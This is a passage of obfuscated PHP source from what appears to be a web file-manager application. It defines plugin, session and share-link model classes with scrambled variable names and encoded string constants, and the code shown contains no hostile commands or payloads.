$ÆÃ–ËÀè) { $‹ïä¼ø =& $_SERVER[ü¢ÙÊñÛ]; $À›¢Š = $this->loadList($«ĞÃáÏğ); if ($ÆÃ–ËÀè) { Hook::apply($«ĞÃáÏğ . $‹ïä¼ø[2091]); } $this->update($À›¢Š[$‹ïä¼ø[486]], array($‹ïä¼ø[2092] => $ÆÃ–ËÀè)); } public function appRegist($²ùüÍÉ¸, $ÉÕò¤¡) { $ïÂÏ²˜Ñ =& $_SERVER[ü¢ÙÊñÛ]; $úĞ˜–‡Ö = $this->loadList($²ùüÍÉ¸); if ($úĞ˜–‡Ö) { $this->update($úĞ˜–‡Ö[$ïÂÏ²˜Ñ[486]], array($ïÂÏ²˜Ñ[2084] => $ÉÕò¤¡)); } else { $±–í†£ = array($ïÂÏ²˜Ñ[42] => $²ùüÍÉ¸, $ïÂÏ²˜Ñ[2084] => $ÉÕò¤¡, $ïÂÏ²˜Ñ[815] => 0, $ïÂÏ²˜Ñ[16] => $this->getConfigDefault($²ùüÍÉ¸)); $this->insert($±–í†£); } } public function getConfigDefault($®ã€äÍ§) { $©›„ªµ =& $_SERVER[ü¢ÙÊñÛ]; $È›˜•üÎ = array(); $Ş›šÁ‡ = $this->getPackageJson($®ã€äÍ§); if (!$Ş›šÁ‡ && is_array($Ş›šÁ‡[$©›„ªµ[2093]])) { return $È›˜•üÎ; } foreach ($Ş›šÁ‡[$©›„ªµ[2093]] as $œ¨Ãä„” => $ÇÏòó«ä) { if (!isset($ÇÏòó«ä[$©›„ªµ[462]]) || isset($È›˜•üÎ[$œ¨Ãä„”])) { continue; } $È›˜•üÎ[$œ¨Ãä„”] = $ÇÏòó«ä[$©›„ªµ[462]]; } return $È›˜•üÎ; } public function getPackageJson($“”ü¼õˆ) { return Hook::apply($“”ü¼õˆ . $_SERVER[ü¢ÙÊñÛ][2094]); } public function getConfig($´É‹‹²È, $ÜöŒ¼è = false) { $Á×êõÒ× =& $_SERVER[ü¢ÙÊñÛ]; $Óè€Ä°· = array(); $Âß«û± = $this->loadList($´É‹‹²È); if ($Âß«û± && is_array($Âß«û±[$Á×êõÒ×[16]])) { $Óè€Ä°· = $Âß«û±[$Á×êõÒ×[16]]; } if (!$Óè€Ä°· || $ÜöŒ¼è) { $Óè€Ä°· = $this->getConfigDefault($´É‹‹²È); } return $Óè€Ä°·; } public function setConfig($Âæ¥•ûŞ, $¾¤Êºùµ = false) { $Îëõß— =& $_SERVER[ü¢ÙÊñÛ]; $Ö’Ï÷¯“ = $this->loadList($Âæ¥•ûŞ); if (!$Ö’Ï÷¯“) { return !1; } $ÓşıèˆÃ = $Ö’Ï÷¯“[$Îëõß—[16]]; if ($¾¤Êºùµ == !1) { $ÓşıèˆÃ = array(); $¾¤Êºùµ = $this->getConfigDefault($Âæ¥•ûŞ); } foreach ($¾¤Êºùµ as $‡İšÛÔ => $Ş¾åÒ¼Ä) { $ÓşıèˆÃ[$‡İšÛÔ] = is_string($Ş¾åÒ¼Ä) ? trim($Ş¾åÒ¼Ä) : $Ş¾åÒ¼Ä; } $this->update($Ö’Ï÷¯“[$Îëõß—[486]], array($Îëõß—[16] => $ÓşıèˆÃ)); } public function viewList() { $–¹úµ‰ =& $_SERVER[ü¢ÙÊñÛ]; $Äôı©§ = $this->loadList(); $this->pluginScan($Äôı©§); $Äôı©§ = $this->loadPluginList(); $‡œˆÕŒ¹ = array(); foreach ($Äôı©§ as $–¸†ØòÒ => $¥Ä­®’ı) { $¿Œ¼ÚùÇ = $¥Ä­®’ı; unset($¥Ä­®’ı[$–¹úµ‰[2084]], $¥Ä­®’ı[$–¹úµ‰[16]]); $Ú¶Ÿ¨”Ë = PLUGIN_DIR . $¥Ä­®’ı[$–¹úµ‰[42]] . $–¹úµ‰[2086]; if (!is_file($Ú¶Ÿ¨”Ë)) { continue; } $ÔäÁÔ‹± = Hook::apply($¥Ä­®’ı[$–¹úµ‰[42]] . $–¹úµ‰[2094]); if (!is_array($ÔäÁÔ‹±)) { continue; } $‡œˆÕŒ¹[$–¸†ØòÒ] = array_merge($¥Ä­®’ı, $ÔäÁÔ‹±); if ($¿Œ¼ÚùÇ[$–¹úµ‰[16]][$–¹úµ‰[1672]] != $ÔäÁÔ‹±[$–¹úµ‰[1646]]) { Hook::apply($¥Ä­®’ı[$–¹úµ‰[42]] . $–¹úµ‰[2091]); $¿Œ¼ÚùÇ[$–¹úµ‰[16]][$–¹úµ‰[1672]] = $ÔäÁÔ‹±[$–¹úµ‰[1646]]; $this->update($¥Ä­®’ı[$–¹úµ‰[486]], array($–¹úµ‰[16] => $¿Œ¼ÚùÇ[$–¹úµ‰[16]])); } } return $‡œˆÕŒ¹; } private function loadPluginList() { $¶õ˜ÖèÃ =& $_SERVER[ü¢ÙÊñÛ]; $—¥À¡ÔÊ = $this->loadList(); if (strtolower(MOD) == $¶õ˜ÖèÃ[2095]) { return $—¥À¡ÔÊ; } $—ÀëÒÓÀ = Hook::trigger($¶õ˜ÖèÃ[2096], $—¥À¡ÔÊ); if ($—¥À¡ÔÊ && !$—ÀëÒÓÀ) { die; } return $—ÀëÒÓÀ ? $—ÀëÒÓÀ : $—¥À¡ÔÊ; } private function pluginScan($‹Âèã£‚) { $³˜ûíÉ‡ =& $_SERVER[ü¢ÙÊñÛ]; recursion_dir(PLUGIN_DIR, $„Å­Šåá, $Şó§ãûµ, 0); foreach ($„Å­Šåá as $±…ø­•) { $¬íê—ÒÛ = get_path_this($±…ø­•); if (isset($‹Âèã£‚[$¬íê—ÒÛ]) || !file_exists($±…ø­• . $³˜ûíÉ‡[2097]) || !file_exists($±…ø­• . $³˜ûíÉ‡[2086])) { continue; } Hook::apply($¬íê—ÒÛ . $³˜ûíÉ‡[2091]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\163\145\x73\x73\151\157\x6e"; public function get($ìÕÓ†Î®) { $ò»“Ÿ«ï =& $_SERVER[ü¢ÙÊñÛ]; $ÓĞªÀ¨½ = $this->where(array($ò»“Ÿ«ï[2098] => $ìÕÓ†Î®))->find(); if (!is_array($ÓĞªÀ¨½)) { return !1; } return $ÓĞªÀ¨½[$ò»“Ÿ«ï[182]]; } public function set($å¦Ê¸ƒò, $—ıòÎÊí, $Àóéåô€ = 3600) { $¼ªÄî„… =& $_SERVER[ü¢ÙÊñÛ]; $àê¹İúì = array($¼ªÄî„…[2098] => $å¦Ê¸ƒò, $¼ªÄî„…[1998] => $—ıòÎÊí, $¼ªÄî„…[2099] => $Àóéåô€ + time()); if (Session::get($¼ªÄî„…[2100])) { $àê¹İúì[$¼ªÄî„…[1759]] = Session::get($¼ªÄî„…[2100]); } else { $àê¹İúì[$¼ªÄî„…[1759]] = 0; } if ($this->get($å¦Ê¸ƒò)) { return $this->where(array($¼ªÄî„…[2098] => $å¦Ê¸ƒò))->save($àê¹İúì); } else { return $this->add($àê¹İúì, array(), !0); } } public function remove($Û‚õÁ—ö) { return $this->where(array($_SERVER[ü¢ÙÊñÛ][2098] => $Û‚õÁ—ö))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ü¢ÙÊñÛ][2101] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\155\157\144\151\146\x79\124\151\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\x73\145\x72\164\54\165\160\144\x61\164\145", "\x66\x75\x6e\143\164\151\157\x6e"), array("\x63\x72\x65\x61\x74\x65\124\151\155\x65", "\164\x69\x6d\145", "\x69\156\163\x65\162\x74", "\146\x75\156\x63\164\x69\157\156"), array("\x6f\x70\x74\x69\157\156\x73", '', "\151\x6e\163\x65\162\164\54\x75\160\x64\x61\x74\145\54\x73\145\x6c\x65\143\164", "\152\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($ı¢­°²Å) { $áØ‚÷Øä =& $_SERVER[ü¢ÙÊñÛ]; $ó°…½è = isset($ı¢­°²Å[0]) ? $ı¢­°²Å[0] : !1; $ßËËÄÍ = $áØ‚÷Øä[2102] . USER_ID; return array($áØ‚÷Øä[2103] => array(USER_ID, $áØ‚÷Øä[2104], $ßËËÄÍ), $áØ‚÷Øä[2043] => array($ó°…½è, $áØ‚÷Øä[2105], $ßËËÄÍ)); } protected function listSimple() { $ï’‰¿©• = array($_SERVER[ü¢ÙÊñÛ][1759] => USER_ID); $°½ï©ÙÌ = $this->field($this->fieldList)->where($ï’‰¿©•)->select(); return $°½ï©ÙÌ ? $°½ï©ÙÌ : array(); } protected function getInfo($”ÀöàñÂ, $®¨Å“ê½ = false, $Áè×ö = '') { $íòæßÎ =& $_SERVER[ü¢ÙÊñÛ]; if ($®¨Å“ê½) { return $this->_getShareInfo(array($íòæßÎ[679] => $”ÀöàñÂ)); } $ª‹ääàª = $this->cacheFunctionGet($íòæßÎ[2045], $”ÀöàñÂ, $Áè×ö); return $ª‹ääàª; } public function getInfoByHash($¡©‘¸ÒÁ) { return $this->_getShareInfo(array($_SERVER[ü¢ÙÊñÛ][2106] => $¡©‘¸ÒÁ)); } public function getInfoByPath($”ÛÓ­¼Í) { $ªÔ€œ‹ =& $_SERVER[ü¢ÙÊñÛ]; $‡ëıìÊ = array($ªÔ€œ‹[1759] => USER_ID, $ªÔ€œ‹[204] => $”ÛÓ­¼Í); return $this->_getShareInfo($‡ëıìÊ); } public function getInfoBySourcePath($ö×Êºõ¯) { $¹ÈçĞ§‡ =& $_SERVER[ü¢ÙÊñÛ]; $æÊ­Á‚Ï = array($¹ÈçĞ§‡[1759] => USER_ID, $¹ÈçĞ§‡[1246] => $ö×Êºõ¯); return $this->_getShareInfo($æÊ­Á‚Ï); } private function _getShareInfo($ÁÁúİ‹Í) { $‚û²“ë =& $_SERVER[ü¢ÙÊñÛ]; $¬Œ¸ÖÆˆ = $this->where($ÁÁúİ‹Í)->find(); if (!$¬Œ¸ÖÆˆ) { return !1; } $ÁÁúİ‹Í = array($‚û²“ë[679] => $¬Œ¸ÖÆˆ[$‚û²“ë[679]]); $ Ù‰‰È» = $‚û²“ë[2107]; $º øúù¬ = Model($‚û²“ë[680])->order($‚û²“ë[486])->field($ Ù‰‰È»)->where($ÁÁúİ‹Í)->select(); if ($¬Œ¸ÖÆˆ[$‚û²“ë[204]] == $‚û²“ë[241]) { $¬Œ¸ÖÆˆ[$‚û²“ë[101]] = IO::info($¬Œ¸ÖÆˆ[$‚û²“ë[1246]]); } else { $¬Œ¸ÖÆˆ[$‚û²“ë[101]] = Model($‚û²“ë[1410])->pathInfo($¬Œ¸ÖÆˆ[$‚û²“ë[204]]); } $¬Œ¸ÖÆˆ[$‚û²“ë[2108]] = $º øúù¬; return $¬Œ¸ÖÆˆ; } protected function getInfoAuth($Å«İëø·) { $Ö«ŒÜ£ =& $_SERVER[ü¢ÙÊñÛ]; $‹ĞŞ è = $this->getInfo($Å«İëø·); if ($‹ĞŞ è[$Ö«ŒÜ£[1759]] == USER_ID) { $‹ĞŞ è[$Ö«ŒÜ£[498]] = $‹ĞŞ è[$Ö«ŒÜ£[101]][$Ö«ŒÜ£[498]]; } else { $‹ĞŞ è[$Ö«ŒÜ£[498]] = Model($Ö«ŒÜ£[578])->authMake($‹ĞŞ è[$Ö«ŒÜ£[2108]]); } return $‹ĞŞ è; } protected function listData($ÕÜàÙäÕ = null, $ß‘¥®Ä = 300) { $÷Ú ³å£ =& $_SERVER[ü¢ÙÊñÛ]; $€˜”îí¾ = array(array($÷Ú ³å£[573] => array($÷Ú ³å£[1078], 0), $÷Ú ³å£[677] => array($÷Ú ³å£[1078], 0), $÷Ú ³å£[2109] => $÷Ú ³å£[2061])); if ($ÕÜàÙäÕ == $÷Ú ³å£[2110]) { $€˜”îí¾ = array($÷Ú ³å£[573] => 1); } else { if ($ÕÜàÙäÕ == $÷Ú ³å£[1231]) { $€˜”îí¾ = array($÷Ú ³å£[677] => 1); } } $€˜”îí¾[$÷Ú ³å£[1759]] = USER_ID; $Ò†ªœø = $this->where($€˜”îí¾)->selectPage($ß‘¥®Ä); return $Ò†ªœø; } protected function listToMe($“Î¥¢Êø = 300) { $ŞÅÀ•±ş =& $_SERVER[ü¢ÙÊñÛ]; $àÊ²âÍ‹ = Model($ŞÅÀ•±ş[2111])->userGroupParents(USER_ID); $âÅü°òÍ = array($ŞÅÀ•±ş[662] => SourceModel::TYPE_USER, $ŞÅÀ•±ş[580] => USER_ID); if ($àÊ²âÍ‹) { $âÅü°òÍ = array(array($ŞÅÀ•±ş[662] => SourceModel::TYPE_USER, $ŞÅÀ•±ş[580] => USER_ID), array($ŞÅÀ•±ş[662] => SourceModel::TYPE_GROUP, $ŞÅÀ•±ş[580] => array($ŞÅÀ•±ş[17], $àÊ²âÍ‹)), $ŞÅÀ•±ş[2109] => $ŞÅÀ•±ş[2061]); } $Ïğõ¼ = Model($ŞÅÀ•±ş[680])->where($âÅü°òÍ)->selectPage($“Î¥¢Êø); $Æƒ½º®ó = array_to_keyvalue_group($Ïğõ¼[$ŞÅÀ•±ş[457]], $ŞÅÀ•±ş[679]); if (!$Æƒ½º®ó) { return $Ïğõ¼; } $®¸×öŒÀ = $ŞÅÀ•±ş[2112]; $âÅü°òÍ = array($ŞÅÀ•±ş[679] => array($ŞÅÀ•±ş[503], array_keys($Æƒ½º®ó)), $ŞÅÀ•±ş[1759] => array($ŞÅÀ•±ş[1080], $ŞÅÀ•±ş[241])); $Â¶½¢·õ = $this->field($®¸×öŒÀ)->where($âÅü°òÍ)->select(); foreach ($Â¶½¢·õ as $¥Á€õí => &$èä€ àã) { $èä€ àã[$ŞÅÀ•±ş[2108]] = $Æƒ½º®ó[$èä€ àã[$ŞÅÀ•±ş[679]]]; } unset($èä€ àã); $¯ç–ÌÉ = array($ŞÅÀ•±ş[2113] => $Â¶½¢·õ, $ŞÅÀ•±ş[2114] => $Ïğõ¼[$ŞÅÀ•±ş[454]]); return $¯ç–ÌÉ; } protected function shareAdd($óêâ˜À“, $ø§ŠÚÊø) { $ÏÂ Âá¨ =& $_SERVER[ü¢ÙÊñÛ]; $¡ÜÍ¡™Æ = $this->_addShareData($óêâ˜À“, $ø§ŠÚÊø); if (!empty($ø§ŠÚÊø[$ÏÂ Âá¨[2115]])) { $this->_shareAuthSet($¡ÜÍ¡™Æ, $ø§ŠÚÊø[$ÏÂ Âá¨[2115]]); } $this->shareEventAdd($óêâ˜À“, $ø§ŠÚÊø, $ÏÂ Âá¨[2116]); return $¡ÜÍ¡™Æ; } protected function shareAddSystem($Ã££®ê, $Œ›¥ª™Œ) { $”»œ‘ÏÚ =& $_SERVER[ü¢ÙÊñÛ]; $´¸Ø«¤ = $this->_addShareData($Ã££®ê, $Œ›¥ª™Œ, $”»œ‘ÏÚ[202]); $this->_shareAuthSet($´¸Ø«¤, $Œ›¥ª™Œ[$”»œ‘ÏÚ[2115]]); return $´¸Ø«¤; } private function shareEventAdd($™Òèº¨, $º‹âÚËÀ, $äÄŠ” = "\141\144\144") { $Ò‚ĞÃÙâ =& $_SERVER[ü¢ÙÊñÛ]; if (!$™Òèº¨ || $™Òèº¨ == $Ò‚ĞÃÙâ[241]) { return; } if ($äÄŠ” == $Ò‚ĞÃÙâ[2116]) { if ($º‹âÚËÀ[$Ò‚ĞÃÙâ[573]] == $Ò‚ĞÃÙâ[102]) { Model($Ò‚ĞÃÙâ[647])->eventShare($™Òèº¨, $Ò‚ĞÃÙâ[2117]); } if ($º‹âÚËÀ[$Ò‚ĞÃÙâ[677]] == $Ò‚ĞÃÙâ[102]) { Model($Ò‚ĞÃÙâ[647])->eventShare($™Òèº¨, $Ò‚ĞÃÙâ[2118]); } return; } $ÔåÒ¸–Î = $this->getInfoByPath($™Òèº¨); $Òë­š´¢ = $Ò‚ĞÃÙâ[2119]; if ($ÔåÒ¸–Î[$Ò‚ĞÃÙâ[573]] == $Ò‚ĞÃÙâ[241] && $º‹âÚËÀ[$Ò‚ĞÃÙâ[573]] == $Ò‚ĞÃÙâ[102]) { $Òë­š´¢ = $Ò‚ĞÃÙâ[2117]; } if ($ÔåÒ¸–Î[$Ò‚ĞÃÙâ[573]] == $Ò‚ĞÃÙâ[102] && $º‹âÚËÀ[$Ò‚ĞÃÙâ[573]] == $Ò‚ĞÃÙâ[241]) { $Òë­š´¢ = $Ò‚ĞÃÙâ[2120]; } if ($ÔåÒ¸–Î[$Ò‚ĞÃÙâ[677]] == $Ò‚ĞÃÙâ[241] && $º‹âÚËÀ[$Ò‚ĞÃÙâ[677]] == $Ò‚ĞÃÙâ[102]) { $Òë­š´¢ = $Ò‚ĞÃÙâ[2118]; } if ($ÔåÒ¸–Î[$Ò‚ĞÃÙâ[677]] == $Ò‚ĞÃÙâ[102] && $º‹âÚËÀ[$Ò‚ĞÃÙâ[677]] == $Ò‚ĞÃÙâ[241]) { $Òë­š´¢ = $Ò‚ĞÃÙâ[2121]; } Model($Ò‚ĞÃÙâ[647])->eventShare($™Òèº¨, $Òë­š´¢); return; } private function _addShareData($‰ö”¡Ìé, $ÙİÛùÍ© = array(), $ú¾«€¬ = false) { $ı–ĞÙÖÚ =& $_SERVER[ü¢ÙÊñÛ]; $ûĞ¡í™î = $ú¾«€¬ == $ı–ĞÙÖÚ[202] ? 0 : USER_ID; $Ñôªµö = array($ı–ĞÙÖÚ[502] => $‰ö”¡Ìé, $ı–ĞÙÖÚ[1750] => $ûĞ¡í™î); if ($‰ö”¡Ìé == 0) { $Ñôªµö = array($ı–ĞÙÖÚ[2122] => $ÙİÛùÍ©[$ı–ĞÙÖÚ[1246]], $ı–ĞÙÖÚ[1750] => $ûĞ¡í™î); } if ($×¤Ìğ®‚ = $this->where($Ñôªµö)->find()) { return $×¤Ìğ®‚[$ı–ĞÙÖÚ[679]]; } if ($‰ö”¡Ìé == 0) { $ÑÄ±Æå™ = array($ı–ĞÙÖÚ[42] => get_path_this($ÙİÛùÍ©[$ı–ĞÙÖÚ[98]])); } else { $ÑÄ±Æå™ = Model($ı–ĞÙÖÚ[890])->sourceInfo($‰ö”¡Ìé); if (!$ÑÄ±Æå™) { return !1; } } if (!$ÙİÛùÍ©[$ı–ĞÙÖÚ[1647]]) { $ÙİÛùÍ©[$ı–ĞÙÖÚ[1647]] = $ÑÄ±Æå™[$ı–ĞÙÖÚ[42]]; } $¬•÷×Ô¦ = array($ı–ĞÙÖÚ[1750] => $ûĞ¡í™î, $ı–ĞÙÖÚ[502] => $‰ö”¡Ìé, $ı–ĞÙÖÚ[1647] => $ı–ĞÙÖÚ[22], $ı–ĞÙÖÚ[573] => 0, $ı–ĞÙÖÚ[677] => 0, $ı–ĞÙÖÚ[1246] => $ı–ĞÙÖÚ[22], $ı–ĞÙÖÚ[394] => $ı–ĞÙÖÚ[22], $ı–ĞÙÖÚ[955] => $ı–ĞÙÖÚ[22], $ı–ĞÙÖÚ[2123] => 0, $ı–ĞÙÖÚ[2124] => 0, $ı–ĞÙÖÚ[826] => 0, $ı–ĞÙÖÚ[2125] => $ı–ĞÙÖÚ[22], $ı–ĞÙÖÚ[2106] => $ı–ĞÙÖÚ[22]); $“Ÿïƒ°Ø = explode($ı–ĞÙÖÚ[60], $ı–ĞÙÖÚ[2126]); foreach ($“Ÿïƒ°Ø as $Óú·§´§) { if (!isset($ÙİÛùÍ©[$Óú·§´§])) { continue; } $¬•÷×Ô¦[$Óú·§´§] = $ÙİÛùÍ©[$Óú·§´§]; } $×Å‹®àÑ = $this->add($¬•÷×Ô¦); $„ÌË¤î¿ = array($ı–ĞÙÖÚ[2106] => short_id($×Å‹®àÑ)); $this->where(array($ı–ĞÙÖÚ[2127] => $×Å‹®àÑ))->save($„ÌË¤î¿); return $×Å‹®àÑ; } private function _shareAuthSet($íûïéİ, $ˆÚĞˆª…) { $ç‰³’å´ =& $_SERVER[ü¢ÙÊñÛ]; if (!is_array($ˆÚĞˆª…)) { return !1; } $†¤£Ç°Ê = Model($ç‰³’å´[2071]); $†¤£Ç°Ê->where(array($ç‰³’å´[679] => $íûïéİ))->delete(); $İ¿çˆä‹ = array(); foreach ($ˆÚĞˆª… as $İ´€•Èû) { $£´¼€‚ = SourceModel::TYPE_USER; if ($İ´€•Èû[$ç‰³’å´[201]] == SourceModel::TYPE_GROUP) { $£´¼€‚ = SourceModel::TYPE_GROUP; } $µœêçì = array($ç‰³’å´[679] => $íûïéİ, $ç‰³’å´[201] => $£´¼€‚, $ç‰³’å´[580] => intval($İ´€•Èû[$ç‰³’å´[580]]), $ç‰³’å´[2067] => 0, $ç‰³’å´[2128] => -1); if ($İ´€•Èû[$ç‰³’å´[2067]]) { $µœêçì[$ç‰³’å´[2067]] = $İ´€•Èû[$ç‰³’å´[2067]]; } else { if ($İ´€•Èû[$ç‰³’å´[2128]]) { $µœêçì[$ç‰³’å´[2128]] = $İ´€•Èû[$ç‰³’å´[2128]]; } } $İ¿çˆä‹[] = $µœêçì; } return $†¤£Ç°Ê->addAll($İ¿çˆä‹, array(), !0); } public function numViewAdd($Ò¶µ°çÌ) { $èÉãŞ™ =& $_SERVER[ü¢ÙÊñÛ]; $¨ıÍ·›õ = array($èÉãŞ™[2127] => $Ò¶µ°çÌ); $this->where($¨ıÍ·›õ)->setAdd($èÉãŞ™[2123]); } public function numDownloadAdd($½Óê¤üü) { $“óÉ—ş× =& $_SERVER[ü¢ÙÊñÛ]; $Ì„»ø’Ñ = array($“óÉ—ş×[2127] => $½Óê¤üü); $this->where($Ì„»ø’Ñ)->setAdd($“óÉ—ş×[2124]); } protected function shareEdit($ëÃ…«İ÷, $¦£¶ƒÉ) { $Ì¶µÅ¤ê =& $_SERVER[ü¢ÙÊñÛ]; $Ã¡Ì¢Ğ€ = $this->getInfo($ëÃ…«İ÷); if (!$Ã¡Ì¢Ğ€) { return !1; } $this->_checkLinkShare($¦£¶ƒÉ, $Ã¡Ì¢Ğ€); $ëÃşËÇ¿ = array(); $ôíÑ“æÃ = explode($Ì¶µÅ¤ê[60], $Ì¶µÅ¤ê[2129]); foreach ($ôíÑ“æÃ as $Å£‰“êÀ) { if (!array_key_exists($Å£‰“êÀ, $¦£¶ƒÉ)) { continue; } $ëÃşËÇ¿[$Å£‰“êÀ] = $¦£¶ƒÉ[$Å£‰“êÀ]; } $this->shareEventAdd($Ã¡Ì¢Ğ€[$Ì¶µÅ¤ê[204]], $¦£¶ƒÉ, $Ì¶µÅ¤ê[1928]); $this->where(array($Ì¶µÅ¤ê[2127] => $ëÃ…«İ÷))->save($ëÃşËÇ¿); if (isset($¦£¶ƒÉ[$Ì¶µÅ¤ê[2115]])) { $this->_shareAuthSet($ëÃ…«İ÷, $¦£¶ƒÉ[$Ì¶µÅ¤ê[2115]]); } return !0; } private function _checkLinkShare($¼²Ê…Ş´, $°¯áÆî«) { $™¹ââºƒ =& $_SERVER[ü¢ÙÊñÛ]; if ($¼²Ê…Ş´[$™¹ââºƒ[573]] != $™¹ââºƒ[102]) { return; } $€¹ìÍü = $°¯áÆî«[$™¹ââºƒ[101]][$™¹ââºƒ[204]]; if ($°¯áÆî«[$™¹ââºƒ[101]][$™¹ââºƒ[43]] != $™¹ââºƒ[243]) { $ïáÆîÜö = $this->_folderReport($€¹ìÍü); if (!$ïáÆîÜö) { return; } show_json(LNG($™¹ââºƒ[2130]) . $™¹ââºƒ[2131] . $ïáÆîÜö, !1); } $œé½•¾û = Model($™¹ââºƒ[890])->fileInfoGet($°¯áÆî«[$™¹ââºƒ[101]][$™¹ââºƒ[204]]); if (!$œé½•¾û) { return; } $ÇËÀğ = $this->shareFileMeta($œé½•¾û[$™¹ââºƒ[552]]); if (isset($ÇËÀğ[$™¹ââºƒ[462]]) && $ÇËÀğ[$™¹ââºƒ[462]] == $™¹ââºƒ[102]) { show_json(LNG($™¹ââºƒ[2132]), !1); } } private function _folderReport($ßéˆ™¯³) { $Ø…²—ÛÜ =& $_SERVER[ü¢ÙÊñÛ]; $Ãô¢³™» = array($Ø…²—ÛÜ[552] => array($Ø…²—ÛÜ[1078], 0), $Ø…²—ÛÜ[815] => 3); $á¡êÓ¨ó = Model($Ø…²—ÛÜ[2133])->where($Ãô¢³™»)->field($Ø…²—ÛÜ[552])->select(); if (!$á¡êÓ¨ó) { return !1; } $á¡êÓ¨ó = array_to_keyvalue($á¡êÓ¨ó, $Ø…²—ÛÜ[22], $Ø…²—ÛÜ[552]); $İ»ò©åÍ = $Ø…²—ÛÜ[60] . $ßéˆ™¯³ . $Ø…²—ÛÜ[60]; $Ãô¢³™» = array($Ø…²—ÛÜ[552] => array($Ø…²—ÛÜ[17], $á¡êÓ¨ó), $Ø…²—ÛÜ[595] => array($Ø…²—ÛÜ[470], "\45{$İ»ò©åÍ}\45"), $Ø…²—ÛÜ[516] => 0); $Ã¦¤‰ˆ¤ = Model($Ø…²—ÛÜ[890])->where($Ãô¢³™»)->field($Ø…²—ÛÜ[2134])->find(); if (!$Ã¦¤‰ˆ¤) { return !1; } $Ô’¼à§Ë = substr($Ã¦¤‰ˆ¤[$Ø…²—ÛÜ[595]], strpos($Ã¦¤‰ˆ¤[$Ø…²—ÛÜ[595]], $İ»ò©åÍ)); $Ãô¢³™» = array($Ø…²—ÛÜ[204] => array($Ø…²—ÛÜ[17], trim($Ô’¼à§Ë, $Ø…²—ÛÜ[60]))); $ÊşÑ°‹÷ = Model($Ø…²—ÛÜ[890])->where($Ãô¢³™»)->field($Ø…²—ÛÜ[42])->select(); $Ù²éşÕÈ = array_to_keyvalue($ÊşÑ°‹÷, $Ø…²—ÛÜ[22], $Ø…²—ÛÜ[42]); $Ù²éşÕÈ[] = $Ã¦¤‰ˆ¤[$Ø…²—ÛÜ[42]]; return implode($Ø…²—ÛÜ[18], $Ù²éşÕÈ); } protected function remove($–óêˆº˜) { $ı½Œüö =& $_SERVER[ü¢ÙÊñÛ]; $·şò¨‹¿ = is_array($–óêˆº˜) ? $–óêˆº˜ : array($–óêˆº˜); for ($”àª½ = 0; $”àª½ < count($·şò¨‹¿); $”àª½++) { $Üø²ËõÌ = $this->getInfo($·şò¨‹¿[$”àª½]); if ($Üø²ËõÌ[$ı½Œüö[677]] == $ı½Œüö[102]) { Model($ı½Œüö[647])->eventShare($Üø²ËõÌ[$ı½Œüö[204]], $ı½Œüö[2121]); } if ($Üø²ËõÌ[$ı½Œüö[573]] == $ı½Œüö[102]) { Model($ı½Œüö[647])->eventShare($Üø²ËõÌ[$ı½Œüö[204]], $ı½Œüö[2120]); } } if (is_array($–óêˆº˜)) { $–óêˆº˜ = array($ı½Œüö[17], $–óêˆº˜); } $şæ¹¼Üü = array($ı½Œüö[679] => $–óêˆº˜); $¨ä”¼şå = $this->where($şæ¹¼Üü)->delete(); if ($¨ä”¼şå) { Model($ı½Œüö[680])->where(array($ı½Œüö[679] => $–óêˆº˜))->delete(); } return $¨ä”¼şå; } protected function removeBySource($ŞÍ°Ğ§) { $à­š„ÚØ =& $_SERVER[ü¢ÙÊñÛ]; $ì ˜Î¦ï = array($à­š„ÚØ[502] => array($à­š„ÚØ[503], $ŞÍ°Ğ§)); $õÔş“œ = $this->field($à­š„ÚØ[679])->where($ì ˜Î¦ï)->select(); $õÔş“œ = array_to_keyvalue($õÔş“œ, $à­š„ÚØ[22], $à­š„ÚØ[679]); if (!$õÔş“œ) { return; } $ì ˜Î¦ï = array($à­š„ÚØ[2127] => array($à­š„ÚØ[503], $õÔş“œ)); $this->where($ì ˜Î¦ï)->delete(); Model($à­š„ÚØ[680])->where($ì ˜Î¦ï)->delete(); } public function listAll($¿ÒÌÙÅ») { $¾™‚İ‰ =& $_SERVER[ü¢ÙÊñÛ]; $ÙñÉÆøŠ = array(); if ($¿ÒÌÙÅ»[$¾™‚İ‰[1759]]) { $ÙñÉÆøŠ[$¾™‚İ‰[1759]] = $¿ÒÌÙÅ»[$¾™‚İ‰[1759]]; } if ($¿ÒÌÙÅ»[$¾™‚İ‰[825]]) { $”£Ôùó = $¿ÒÌÙÅ»[$¾™‚İ‰[826]] ? $¿ÒÌÙÅ»[$¾™‚İ‰[826]] : strtotime(date($¾™‚İ‰[2135])); $ÙñÉÆøŠ[$¾™‚İ‰[244]] = array($¾™‚İ‰[420], array($¿ÒÌÙÅ»[$¾™‚İ‰[825]], $”£Ôùó)); } if ($¿ÒÌÙÅ»[$¾™‚İ‰[43]]) { $ÙñÉÆøŠ[$¿ÒÌÙÅ»[$¾™‚İ‰[43]]] = 1; } else { $ÙñÉÆøŠ[] = array($¾™‚İ‰[573] => array($¾™‚İ‰[1078], 0), $¾™‚İ‰[677] => array($¾™‚İ‰[1078], 0), $¾™‚İ‰[2109] => $¾™‚İ‰[2061]); } if ($¿ÒÌÙÅ»[$¾™‚İ‰[2057]]) { $ÙñÉÆøŠ[] = array($¾™‚İ‰[2106] => $¿ÒÌÙÅ»[$¾™‚İ‰[2057]], $¾™‚İ‰[1647] => array($¾™‚İ‰[470], "\x25{$¿ÒÌÙÅ»[$¾™‚İ‰[2057]]}\x25"), $¾™‚İ‰[2109] => $¾™‚İ‰[2061]); } $íçë™Ñ = $this->_makeOrder()->where($ÙñÉÆøŠ)->selectPage(20); if (empty($íçë™Ñ[$¾™‚İ‰[457]])) { return array(); } $this->_listDataApply($íçë™Ñ[$¾™‚İ‰[457]]); return $íçë™Ñ; } public function listDataApply($Æ¾Óó—) { $this->_listDataApply($Æ¾Óó—); return $Æ¾Óó—; } private function _listDataApply(&$Íåˆ›ÒØ) { $²õ©Ü« =& $_SERVER[ü¢ÙÊñÛ]; $´îØÏã = array_to_keyvalue($Íåˆ›ÒØ, $²õ©Ü«[22], $²õ©Ü«[1759]); $„ğ¾êÙÒ = Model($²õ©Ü«[608])->userListInfo(array_unique($´îØÏã)); $¿Û«İú½ = array_to_keyvalue($Íåˆ›ÒØ, 